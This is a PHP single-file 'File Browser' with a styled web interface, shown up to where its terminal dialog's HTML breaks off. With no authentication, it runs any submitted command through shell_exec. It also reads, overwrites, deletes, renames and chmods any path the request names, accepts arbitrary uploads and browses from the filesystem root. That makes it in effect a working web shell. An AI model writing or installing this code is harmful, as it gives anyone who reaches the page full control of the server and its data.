<?php
ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
error_log("Script started");
error_log("POST data: " . print_r($_POST, true));
error_log("GET data: " . print_r($_GET, true));

// Define base directory and root directory
// $root_directory = __DIR__; // This sets the root directory to the current script's directory
// $requested_path = isset($_GET['dir']) ? $_GET['dir'] : '';
// $full_path = realpath($root_directory . DIRECTORY_SEPARATOR . $requested_path);

// Security check: Make sure the requested path is within the allowed directory
// if ($full_path === false || strpos($full_path, $root_directory) !== 0) {
//     $full_path = $root_directory;
// }

// error_log("Root directory: " . $root_directory);
// error_log("Requested path: " . $requested_path);
// error_log("Full path: " . $full_path);

// Define base directory and root directory
$root_directory = __DIR__; // This sets the root directory to the current script's directory
$requested_path = isset($_GET['dir']) ? $_GET['dir'] : '';
$full_path = realpath($root_directory . DIRECTORY_SEPARATOR . $requested_path);

// Security check: Make sure the requested path is within the allowed directory
if ($full_path === false || strpos($full_path, $root_directory) !== 0) {
    $full_path = $root_directory;
}

error_log("Root directory: " . $root_directory);
error_log("Requested path: " . $requested_path);
error_log("Full path: " . $full_path);


// Backend logic
$action = isset($_POST['action']) ? $_POST['action'] : '';

switch ($action) {
    case 'get_content':
        $file = urldecode($_POST['file']);
        if (file_exists($file) && is_file($file)) {
            echo json_encode(['content' => file_get_contents($file)]);
        } else {
            echo json_encode(['error' => 'File not found or is not a regular file.']);
        }
        exit;

    case 'save':
        $file = urldecode($_POST['file']);
        $content = $_POST['content'];
        if (file_exists($file) && is_file($file)) {
            if (file_put_contents($file, $content) !== false) {
                echo json_encode(['message' => 'File saved successfully.']);
            } else {
                echo json_encode(['error' => 'Error saving file.']);
            }
        } else {
            echo json_encode(['error' => 'File not found or is not a regular file.']);
        }
        exit;

    // case 'rename':
        // error_log("Rename action triggered");
        // $oldName = urldecode($_POST['oldName']);
        // $newName = dirname($oldName) . DIRECTORY_SEPARATOR . basename($_POST['newName']);
        // $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
        
        // error_log("Old name: " . $oldName);
        // error_log("New name: " . $newName);
        // error_log("Is directory: " . ($isDir ? "Yes" : "No"));
        // error_log("File exists: " . (file_exists($oldName) ? "Yes" : "No"));
        // error_log("Is directory: " . (is_dir($oldName) ? "Yes" : "No"));
        // error_log("Is writable: " . (is_writable(dirname($oldName)) ? "Yes" : "No"));
        
        // if (file_exists($oldName)) {
        //     if (rename($oldName, $newName)) {
        //         error_log(($isDir ? "Directory" : "File") . " renamed successfully");
        //         echo json_encode(['message' => ($isDir ? 'Folder' : 'File') . ' renamed successfully.']);
        //     } else {
        //         $error = error_get_last();
        //         error_log("Rename failed. Error: " . $error['message']);
        //         echo json_encode(['error' => 'Error renaming ' . ($isDir ? 'folder' : 'file') . '. Error: ' . $error['message']]);
        //     }
        // } else {
        //     error_log("File or folder not found: " . $oldName);
        //     echo json_encode(['error' => 'File or folder not found.']);
        // }
        // exit;

        case 'rename':
            error_log("Rename action triggered");
            $oldName = urldecode($_POST['oldName']);
            $newName = dirname($oldName) . DIRECTORY_SEPARATOR . basename($_POST['newName']);
            $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
            
            error_log("Old name: " . $oldName);
            error_log("New name: " . $newName);
            error_log("Is directory: " . ($isDir ? "Yes" : "No"));
            
            if (file_exists($oldName)) {
                if (rename($oldName, $newName)) {
                    error_log(($isDir ? "Directory" : "File") . " renamed successfully");
                    echo json_encode(['success' => true, 'message' => ($isDir ? 'Folder' : 'File') . ' renamed successfully.']);
                } else {
                    $error = error_get_last();
                    error_log("Rename failed. Error: " . $error['message']);
                    echo json_encode(['success' => false, 'message' => 'Error renaming ' . ($isDir ? 'folder' : 'file') . '. Error: ' . $error['message']]);
                }
            } else {
                error_log("File or folder not found: " . $oldName);
                echo json_encode(['success' => false, 'message' => 'File or folder not found.']);
            }
            exit;

    case 'delete':
        $file = urldecode($_POST['file']);
        $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
        if (file_exists($file)) {
            if ($isDir) {
                if (rmdir($file)) {
                    echo json_encode(['message' => 'Folder deleted successfully.']);
                } else {
                    echo json_encode(['error' => 'Error deleting folder. Make sure it\'s empty.']);
                }
            } else {
                if (unlink($file)) {
                    echo json_encode(['message' => 'File deleted successfully.']);
                } else {
                    echo json_encode(['error' => 'Error deleting file.']);
                }
            }
        } else {
            echo json_encode(['error' => 'File or folder not found.']);
        }
        exit;

    case 'chmod':
        $file = urldecode($_POST['file']);
        $permissions = octdec($_POST['permissions']);
        $isDir = isset($_POST['is_dir']) && $_POST['is_dir'] == 1;
        if (file_exists($file)) {
            if (chmod($file, $permissions)) {
                echo json_encode(['message' => 'Permissions changed successfully.']);
            } else {
                echo json_encode(['error' => 'Error changing permissions.']);
            }
        } else {
            echo json_encode(['error' => 'File or folder not found.']);
        }
        exit;
}

// Handle downloads (GET request)
if (isset($_GET['action']) && $_GET['action'] === 'download' && isset($_GET['file'])) {
    $file = $_GET['file'];
    $filePath = realpath($full_path . DIRECTORY_SEPARATOR . $file);
    $isDir = isset($_GET['is_dir']) && $_GET['is_dir'] == '1';

    // Debug information
    error_log("Download requested for: " . $filePath);
    error_log("Full path: " . $full_path);
    error_log("File: " . $file);
    error_log("Is directory: " . ($isDir ? "Yes" : "No"));

    // Check if the file/folder exists and is within the allowed directory
    if ($filePath && strpos($filePath, realpath($root_directory)) === 0) {
        if (!$isDir && is_file($filePath)) {
            // File download
            header('Content-Description: File Transfer');
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
            header('Expires: 0');
            header('Cache-Control: must-revalidate');
            header('Pragma: public');
            header('Content-Length: ' . filesize($filePath));
            readfile($filePath);
            exit;
        } elseif ($isDir && is_dir($filePath)) {
            // Folder download
            $folderName = basename($filePath);
            $zipFileName = $folderName . '.zip';
            $zipFilePath = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $zipFileName;

            // Use ZipArchive
            $zip = new ZipArchive();
            if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
                error_log("Cannot create zip file: " . $zipFilePath);
                die("Cannot create zip file.");
            }

            $files = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($filePath),
                RecursiveIteratorIterator::LEAVES_ONLY
            );

            $fileCount = 0;
            foreach ($files as $name => $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($filePath) + 1);
                    if ($zip->addFile($filePath, $relativePath)) {
                        $fileCount++;
                    } else {
                        error_log("Failed to add file to zip: " . $filePath);
                    }
                }
            }

            $zip->close();

            if ($fileCount == 0) {
                error_log("No files were added to the zip archive.");
                die("Failed to create zip file: No files were added.");
            }

            if (!file_exists($zipFilePath) || filesize($zipFilePath) == 0) {
                error_log("Created zip file is empty or doesn't exist: " . $zipFilePath);
                die("Failed to create valid zip file.");
            }

            header('Content-Type: application/zip');
            header('Content-disposition: attachment; filename=' . $zipFileName);
            header('Content-Length: ' . filesize($zipFilePath));
            readfile($zipFilePath);
            unlink($zipFilePath);
            exit;
        } else {
            error_log("Invalid file or folder type: " . $filePath);
            die("Invalid file or folder type.");
        }
    } else {
        error_log("File or folder not found or access denied: " . $filePath);
        die("File or folder not found or access denied.");
    }
}




// Handle create folder
if (isset($_POST['action']) && $_POST['action'] == 'create_folder') {
    $folder_name = sanitize_input($_POST['folder_name']);
    $new_folder_path = $full_path . DIRECTORY_SEPARATOR . $folder_name;
    error_log("Attempting to create folder: " . $new_folder_path);
    if (!file_exists($new_folder_path)) {
        if (mkdir($new_folder_path, 0755, true)) {
            error_log("Folder created successfully: " . $new_folder_path);
            echo json_encode(['success' => true, 'message' => 'Folder created successfully']);
        } else {
            error_log("Failed to create folder: " . $new_folder_path . ". Error: " . error_get_last()['message']);
            echo json_encode(['success' => false, 'message' => 'Failed to create folder']);
        }
    } else {
        error_log("Folder already exists: " . $new_folder_path);
        echo json_encode(['success' => false, 'message' => 'Folder already exists']);
    }
    exit;
}


    
    // Check if file_name is not empty

// Handle file creation
if (isset($_POST['action']) && $_POST['action'] == 'create_file') {
    error_log("File creation request received");
    $file_name = sanitize_input($_POST['file_name']);
    $content = $_POST['content'];
    
    error_log("Attempting to create file: " . $file_name);
    
    if (empty($file_name)) {
        error_log("File name is empty");
        echo json_encode(['success' => false, 'message' => 'File name cannot be empty']);
        exit;
    }
    
    $new_file_path = $full_path . DIRECTORY_SEPARATOR . $file_name;
    error_log("Full file path: " . $new_file_path);
    
    if (file_exists($new_file_path)) {
        error_log("File already exists: " . $new_file_path);
        echo json_encode(['success' => false, 'message' => 'File already exists']);
    } else {
        if (is_writable($full_path)) {
            $result = file_put_contents($new_file_path, $content);
            if ($result !== false) {
                error_log("File created successfully: " . $new_file_path);
                echo json_encode(['success' => true, 'message' => 'File created successfully']);
            } else {
                $error = error_get_last();
                error_log("Failed to create file: " . $new_file_path . ". Error: " . $error['message']);
                echo json_encode(['success' => false, 'message' => 'Failed to create file. Error: ' . $error['message']]);
            }
        } else {
            error_log("No write permission for directory: " . $full_path);
            echo json_encode(['success' => false, 'message' => 'No write permission for the directory']);
        }
    }
    exit;
}
 

// Function to sanitize user input
function sanitize_input($input) {
    return htmlspecialchars(strip_tags($input));
}


// Handle file upload
if (isset($_POST['action']) && $_POST['action'] == 'upload_file') {
    if (isset($_FILES['file'])) {
        $file_name = sanitize_input($_FILES['file']['name']);
        $file_tmp = $_FILES['file']['tmp_name'];
        $file_path = $full_path . DIRECTORY_SEPARATOR . $file_name;
        
        error_log("Attempting to upload file: " . $file_path);
        
        if (move_uploaded_file($file_tmp, $file_path)) {
            error_log("File uploaded successfully: " . $file_path);
            echo json_encode(['success' => true, 'message' => 'File uploaded successfully']);
        } else {
            $upload_error = error_get_last();
            error_log("Failed to upload file: " . $file_path . ". Error: " . $upload_error['message']);
            echo json_encode(['success' => false, 'message' => 'Failed to upload file. Error: ' . $upload_error['message']]);
        }
    } else {
        error_log("No file was uploaded");
        echo json_encode(['success' => false, 'message' => 'No file was uploaded']);
    }
    exit;
}


// Handle command execution
if (isset($_POST['action']) && $_POST['action'] == 'execute_command') {
    $command = $_POST['command'];
    // IMPORTANT: Be extremely careful with command execution. This can be very dangerous if not properly secured.
    // Consider using a whitelist of allowed commands or implementing strict access controls.
    $output = shell_exec($command . " 2>&1");
    echo json_encode(['success' => true, 'output' => $output]);
    exit;
}


// Frontend code
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Browser</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.7.2/font/bootstrap-icons.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        body {
            background-color: #0d1117;
            color: #e6edf3;
            min-height: 100vh;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
        }

        .container {
            background: #161b22;
            border-radius: 10px; 
            padding: 24px;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
            margin-top: 50px;
        }

        .list-group-item {
            background: #0d1117;
            border: 1px solid #30363d;
            color: #e6edf3;
            margin-bottom: 8px;
            border-radius: 6px;
            transition: all 0.2s ease;
        }

        .list-group-item:hover {
            background: #161b22;
            border-color: #8b949e;
        }

        .btn {
            border-radius: 6px;
            padding: 5px 16px;
            transition: all 0.2s ease;
            background-color: #21262d;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }

        .btn:hover {
            background-color: #30363d;
            border-color: #8b949e;
        }

        .btn-primary {
            background-color: #238636;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }
        
        
        .btn-danger{
            background-color:  #dc3545;
            border-color: rgba(240, 246, 252, 0.1);
            color: #ffffff;
        }

       

        .btn-primary:hover {
            background-color: #2ea043;
            border-color: rgba(240, 246, 252, 0.1);
        }

        .modal-content {
            background: #161b22;
            color: #e6edf3; 
            border-radius: 6px;
            border: 1px solid #30363d;
        }

        .modal-header, .modal-footer {
            border-color: #30363d;
        }

        .form-control {
            background-color: #0d1117;
            border-color: #30363d;
            color: #e6edf3; 
        }

        .form-control:focus {
            background-color: #0d1117;
            border-color: #58a6ff;
            color: #e6edf3; 
            box-shadow: 0 0 0 3px rgba(88, 166, 255, 0.3);
        }

        a {
            color: #58a6ff; 
        }

        a:hover {
            color: #79c0ff;
        }

        /* Theme switch styles */
        .theme-switch-wrapper {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .theme-switch {
            display: inline-block;
            height: 34px;
            position: relative;
            width: 60px;
        }

        .theme-switch input {
            display: none;
        }

        .slider {
            background-color: #ccc;
            bottom: 0;
            cursor: pointer;
            left: 0;
            position: absolute;
            right: 0;
            top: 0;
            transition: .4s;
        }

        .slider:before {
            background-color: #fff;
            bottom: 4px;
            content: "";
            height: 26px;
            left: 4px;
            position: absolute;
            transition: .4s;
            width: 26px;
        }

        input:checked + .slider {
            background-color: #66bb6a;
        }

        input:checked + .slider:before {
            transform: translateX(26px);
        }

        .slider.round {
            border-radius: 34px;
        }

        .slider.round:before {
            border-radius: 50%;
        }

        /* Light mode styles */
        body.light-mode {
            background-color: #ffffff;
            color: #24292e;
            background-image: url('https://w0.peakpx.com/wallpaper/935/234/HD-wallpaper-kaguya-sama-is-kaguya-love-war.jpg');            background-size: cover;
            background-position: center center;
            background-repeat: no-repeat;
            background-attachment: fixed;
        }

        body.light-mode .container {
            background-color: rgba(0, 0, 0, 0.7);
            box-shadow: 0 0 15px rgba(255, 255, 255, 0.1);
        }

        body.light-mode .list-group-item {
            background-color: rgba(30, 30, 30, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.125);
            color: #ffffff;
        }

        body.light-mode .list-group-item:hover {
            background-color: rgba(50, 50, 50, 0.9);
        }

        body.light-mode a {
            color: #58a6ff;
        }

        body.light-mode a:hover {
            color: #79c0ff;
        }

body.light-mode .btn:hover {
    background: rgba(255, 255, 255, 0.2);
    box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
}

/* Custom scrollbar for webkit browsers */
body.light-mode::-webkit-scrollbar {
    width: 10px;
}

body.light-mode::-webkit-scrollbar-track {
    background: rgba(255, 255, 255, 0.1);
}

body.light-mode::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.3);
    border-radius: 5px;
}

body.light-mode::-webkit-scrollbar-thumb:hover {
    background: rgba(255, 255, 255, 0.5);
}
       


        body.light-mode .btn-outline-primary,
        body.light-mode .btn-outline-info,
        body.light-mode .btn-outline-danger,
        body.light-mode .btn-outline-success,
        body.light-mode .btn-outline-warning {
            color: #ffffff;
            border-color: #ffffff;
        }

        body.light-mode .btn-outline-primary:hover,
        body.light-mode .btn-outline-info:hover,
        body.light-mode .btn-outline-danger:hover,
        body.light-mode .btn-outline-success:hover,
        body.light-mode .btn-outline-warning:hover {
            background-color: rgba(255, 255, 255, 0.2);
        }

        /* Icon colors */
        .bi-pencil { color: #3498db; }  /* Edit - Asul */
        .bi-pencil-square { color: #f1c40f; }  /* Rename - Dilaw */
        .bi-trash { color: #e74c3c; }  /* Delete - Pula */
        .bi-download { color: #2ecc71; }  /* Download - Berde */
        .bi-shield-lock { color: #95a5a6; }  /* Change Permissions - Kulay-abo */

        /* Hover effects */
        .btn:hover .bi-pencil { color: #2980b9; }
        .btn:hover .bi-pencil-square { color: #f39c12; }
        .btn:hover .bi-trash { color: #c0392b; }
        .btn:hover .bi-download { color: #27ae60; }
        .btn:hover .bi-shield-lock { color: #7f8c8d; }

        /* Dark mode adjustments */
        body:not(.light-mode) .bi-pencil { color: #3498db; }
        body:not(.light-mode) .bi-pencil-square { color: #f1c40f; }
        body:not(.light-mode) .bi-trash { color: #e74c3c; }
        body:not(.light-mode) .bi-download { color: #2ecc71; }
        body:not(.light-mode) .bi-shield-lock { color: #bdc3c7; }

        /* Light mode adjustments */
        body.light-mode .bi-pencil { color: #2980b9; }
        body.light-mode .bi-pencil-square { color: #f39c12; }
        body.light-mode .bi-trash { color: #c0392b; }
        body.light-mode .bi-download { color: #27ae60; }
        body.light-mode .bi-shield-lock { color: #95a5a6; }

        .breadcrumb {
            border: 1px solid;
            transition: all 0.3s ease;
            padding: 0.75rem 1rem;
            margin-bottom: 1rem;
            border-radius: 0.25rem;
        }

        .breadcrumb:hover {
            box-shadow: 0 0.5rem 1rem rgba(0, 0, 0, 0.15) !important;
        }

        .breadcrumb-item + .breadcrumb-item::before {
            content: "›";
        }

        .breadcrumb-item a {
            transition: color 0.2s ease;
        }

        .breadcrumb-item a:hover {
            text-decoration: underline !important;
        }

        /* Light mode styles */
        body.light-mode .breadcrumb {
            background-color: #f6f8fa;
            border-color: #d0d7de;
        }

        body.light-mode .breadcrumb-item + .breadcrumb-item::before {
            color: #6c757d;
        }

        body.light-mode .breadcrumb-item a {
            color: #0969da;
        }

        body.light-mode .breadcrumb-item a:hover {
            color: #0a58ca;
        }

        body.light-mode .breadcrumb-item.active {
            color: #24292f;
        }

        /* Dark mode styles */
        body:not(.light-mode) .breadcrumb {
            background-color: #161b22;
            border-color: #30363d;
        }

        body:not(.light-mode) .breadcrumb-item + .breadcrumb-item::before {
            color: #8b949e;
        }

        body:not(.light-mode) .breadcrumb-item a {
            color: #58a6ff;
        }

        body:not(.light-mode) .breadcrumb-item a:hover {
            color: #79c0ff;
        }

        body:not(.light-mode) .breadcrumb-item.active {
            color: #c9d1d9;
        }

        .list-group-item i {
            margin-right: 10px;
            width: 20px;
            text-align: center;
        }

        /* Adjust icon colors for dark mode */
        body:not(.light-mode) .fa-folder {
            color: #ffd700 !important;
        }

        body:not(.light-mode) .fa-image {
            color: #28a745 !important;
        }

        body:not(.light-mode) .fa-video {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-music {
            color: #17a2b8 !important;
        }

        body:not(.light-mode) .fa-file-pdf {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-file-word {
            color: #007bff !important;
        }

        body:not(.light-mode) .fa-file-excel {
            color: #28a745 !important;
        }

        body:not(.light-mode) .fa-file-powerpoint {
            color: #ffc107 !important;
        }

        body:not(.light-mode) .fa-file-archive {
            color: #6c757d !important;
        }

        body:not(.light-mode) .fa-php {
            color: #a074c4 !important;
        }

        body:not(.light-mode) .fa-html5 {
            color: #dc3545 !important;
        }

        body:not(.light-mode) .fa-css3-alt {
            color: #007bff !important;
        }

        body:not(.light-mode) .fa-js-square {
            color: #ffc107 !important;
        }

        body:not(.light-mode) .fa-file {
            color: #6c757d !important;
        }

 body:not(.light-mode) #renameNewFileName {
    background-color: #2c3e50;
    color: #ffffff;
    border-color: #34495e;
}

body:not(.light-mode) #renameNewFileName:focus {
    background-color: #34495e;
    color: #ffffff;
    border-color: #3498db;
    box-shadow: 0 0 0 0.2rem rgba(52, 152, 219, 0.25);
}

body:not(.light-mode) .modal-content {
    background-color: #2c3e50;
    color: #ecf0f1;
}

body:not(.light-mode) .modal-header {
    border-bottom-color: #34495e;
}

body:not(.light-mode) .modal-footer {
    border-top-color: #34495e;
}

body:not(.light-mode) .modal-title {
    color: #ecf0f1;
}


        /* Modal styles */
.modal-content {
    background-color: #f8f9fa;
    border: none;
    border-radius: 0.3rem;
}

.modal-header {
    border-bottom: 1px solid #dee2e6;
    background-color: #e9ecef;
}

.modal-footer {
    border-top: 1px solid #dee2e6;
    background-color: #e9ecef;
}

/* Terminal styles */
#terminal-output {
    font-family: 'Courier New', Courier, monospace;
    font-size: 0.9rem;
}

#terminal-input {
    font-family: 'Courier New', Courier, monospace;
}
    </style>
</head>
<body>
    <div class="theme-switch-wrapper">
        <label class="theme-switch" for="checkbox">
            <input type="checkbox" id="checkbox" />
            <div class="slider round"></div>
        </label>
    </div>
    <div class="container mt-4">
        <!-- <h1 class="mb-4">File Browser</h1> -->
        <div class="d-flex justify-content-between align-items-center mb-3">
        <div>
            <a href="?dir=/" class="btn btn-primary me-2">Root</a>
            <a href="?dir=<?php echo urlencode($baseDir); ?>" class="btn btn-danger">Home</a>
        </div>
        <div>
            <button class="btn btn-success me-2" data-bs-toggle="modal" data-bs-target="#newFolderModal">
                <i class="fas fa-folder-plus"></i> New Folder
            </button>
            <button class="btn btn-info me-2" data-bs-toggle="modal" data-bs-target="#newFileModal">
                <i class="fas fa-file-plus"></i> New File
            </button>
            <button class="btn btn-warning me-2" data-bs-toggle="modal" data-bs-target="#uploadFileModal">
                <i class="fas fa-upload"></i> Upload File
            </button>
            <button class="btn btn-secondary" data-bs-toggle="modal" data-bs-target="#terminalModal">
                <i class="fas fa-terminal"></i> Terminal
            </button>
        </div>
    </div>
        <?php
        // Get the current working directory (no need to hardcode a path)
        $baseDir = getcwd();


        // Set the current directory to the one passed through the URL, or default to the base directory
        $directory = isset($_GET['dir']) ? $_GET['dir'] : $baseDir;

        // Normalize the directory path using realpath()
        $directory = realpath($directory);

        // Check if the directory is valid
        if (!$directory || !is_dir($directory)) {
            die("Invalid directory.");
        }


        function getFileIcon($filename) {
            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            switch ($extension) {
                case 'jpg':
                case 'jpeg':
                case 'png':
                case 'gif':
                case 'bmp':
                case 'svg':
                    return '<i class="fas fa-image text-success"></i>';
                case 'mp4':
                case 'avi':
                case 'mov':
                case 'wmv':
                    return '<i class="fas fa-video text-danger"></i>';
                case 'mp3':
                case 'wav':
                case 'ogg':
                    return '<i class="fas fa-music text-info"></i>';
                case 'pdf':
                    return '<i class="fas fa-file-pdf text-danger"></i>';
                case 'doc':
                case 'docx':
                    return '<i class="fas fa-file-word text-primary"></i>';
                case 'xls':
                case 'xlsx':
                    return '<i class="fas fa-file-excel text-success"></i>';
                case 'ppt':
                case 'pptx':
                    return '<i class="fas fa-file-powerpoint text-warning"></i>';
                case 'zip':
                case 'rar':
                case '7z':
                    return '<i class="fas fa-file-archive text-secondary"></i>';
                case 'php':
                    return '<i class="fab fa-php text-purple"></i>';
                case 'html':
                case 'htm':
                    return '<i class="fab fa-html5 text-danger"></i>';
                case 'css':
                    return '<i class="fab fa-css3-alt text-primary"></i>';
                case 'js':
                    return '<i class="fab fa-js-square text-warning"></i>';
                default:
                    return '<i class="fas fa-file text-secondary"></i>';
            }
        }



        // echo  '<div>';
        // echo "<a href='?dir=" . urlencode('/') . "' class='btn btn-primary me-2 mb-3'>Root</a>";
        // echo "<a href='?dir=" . urlencode($baseDir) . "' class='btn btn-danger mb-3'>Home</a>";
        // echo  '</div>';




        // Scan the directory for files and directories
        $files = scandir($directory);

        // Filter out current (.) and parent (..) directories
        $files = array_diff($files, array( '.' , '..'));

        // Display the clickable path of the current directory
        $pathParts = explode(DIRECTORY_SEPARATOR, $directory);
        $clickablePath = "";
        echo "<nav aria-label='breadcrumb'>";
        echo "<ol class='breadcrumb rounded-3'>";
        foreach ($pathParts as $key => $part) {
            $clickablePath .= ($key > 0 ? DIRECTORY_SEPARATOR : '') . $part;
            if ($key === array_key_last($pathParts)) {
                echo "<li class='breadcrumb-item active' aria-current='page'><strong>" . htmlspecialchars($part) . "</strong></li>";
            } else {
                echo "<li class='breadcrumb-item'><a href='?dir=" . urlencode($clickablePath) . "' class='text-decoration-none'>" . htmlspecialchars($part) . "</a></li>";
            }
        }
        echo "</ol>";
        echo "</nav>";

        // List the directories and files in the current directory
        echo "<div class='list-group'>";
        foreach ($files as $file) {
            $filePath = $directory . DIRECTORY_SEPARATOR . $file;
            $isDir = is_dir($filePath);
            
            echo "<div class='list-group-item d-flex justify-content-between align-items-center'>";
            if ($isDir) {
                echo "<a href='?dir=" . urlencode($filePath) . "' class='text-decoration-none'>";
                echo "<i class='fas fa-folder text-warning'></i>" . $file;
                echo "</a>";
            } else {
                $icon = getFileIcon($file);
                echo "<span>$icon " . htmlspecialchars($file) . "</span>";
            }
            
            // Action buttons
            echo "<div class='btn-group'>";
            if ($isDir) {
                echo "<button class='btn btn-sm btn-outline-info rename-btn' data-file='" . urlencode(realpath($filePath)) . "' data-is-dir='1'><i class='bi bi-pencil-square'></i></button>";
                echo "<button class='btn btn-sm btn-outline-danger delete-btn' data-file='" . urlencode($filePath) . "' data-is-dir='1'><i class='bi bi-trash'></i></button>";
                echo "<button class='btn btn-sm btn-outline-warning chmod-btn' data-file='" . urlencode($filePath) . "' data-is-dir='1'><i class='bi bi-shield-lock'></i></button>";
                echo "<a href='?action=download&file=" . urlencode($file) . "&is_dir=1' class='btn btn-sm btn-outline-success' title='Download as ZIP'><i class='bi bi-file-earmark-zip'></i></a>";
            } else {
                echo "<button class='btn btn-sm btn-outline-primary edit-btn' data-file='" . urlencode($filePath) . "'><i class='bi bi-pencil'></i></button>";
                echo "<button class='btn btn-sm btn-outline-info rename-btn' data-file='" . urlencode($filePath) . "'><i class='bi bi-pencil-square'></i></button>";
                echo "<button class='btn btn-sm btn-outline-danger delete-btn' data-file='" . urlencode($filePath) . "'><i class='bi bi-trash'></i></button>";
                echo "<a href='?action=download&file=" . urlencode($file) . "' class='btn btn-sm btn-outline-success' title='Download'><i class='bi bi-download'></i></a>";
                echo "<button class='btn btn-sm btn-outline-warning chmod-btn' data-file='" . urlencode($filePath) . "'><i class='bi bi-shield-lock'></i></button>";
            }
            echo "</div>";
            
            echo "</div>";
        }
        echo "</div>";
        ?>

    </div>

    <!-- Modals for edit, rename, and chmod -->
    <div class="modal fade" id="editModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog modal-lg">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <textarea class="form-control" id="fileContent" rows="10"></textarea>
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveEdit">Save changes</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Rename Modal -->
<div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="renameModalLabel">Rename</h5>
        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
      </div>
      <div class="modal-body">
        <input type="hidden" id="oldFileName">
        <div class="form-group">
          <label for="renameNewFileName">New Name:</label>
          <input type="text" class="form-control" id="renameNewFileName">
        </div>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" id="saveRename">Rename</button>
      </div>
    </div>
  </div>
</div>
   
    <div class="modal fade" id="chmodModal" tabindex="-1" aria-hidden="true">
        <div class="modal-dialog">
            <div class="modal-content">
                <div class="modal-header">
                    <h5 class="modal-title"></h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body">
                    <input type="hidden" id="chmodFileName">
                    <input type="hidden" id="chmodIsDir">
                    <input type="text" class="form-control" id="permissions" placeholder="Enter permissions (e.g., 0755)">
                </div>
                <div class="modal-footer">
                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    <button type="button" class="btn btn-primary" id="saveChmod">Change Permissions</button>
                </div>
            </div>
        </div>
    </div>

   
<div class="modal fade" id="newFolderModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Create New Folder</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="text" class="form-control" id="newFolderName" placeholder="Enter folder name">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="createFolderBtn">Create</button>
            </div>
        </div>
    </div>
</div>

<!-- File Creation Modal -->
<div class="modal fade" id="newFileModal" tabindex="-1" aria-labelledby="newFileModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="newFileModalLabel">Create New File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="text" class="form-control mb-2" id="newFileName" name="newFileName" placeholder="Enter file name">
                <textarea class="form-control" id="newFileContent" name="newFileContent" rows="5" placeholder="Enter file content"></textarea>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="createFileBtn">Create</button>
            </div>
        </div>
    </div>
</div>


<div class="modal fade" id="uploadFileModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Upload File</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
                <input type="file" class="form-control" id="fileToUpload">
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                <button type="button" class="btn btn-primary" id="uploadFileBtn">Upload</button>
            </div>
        </div>
    </div>
</div>

<div class="modal fade" id="terminalModal" tabindex="-1" aria-hidden="true">
    <div class="modal-dialog modal-lg">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Terminal</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
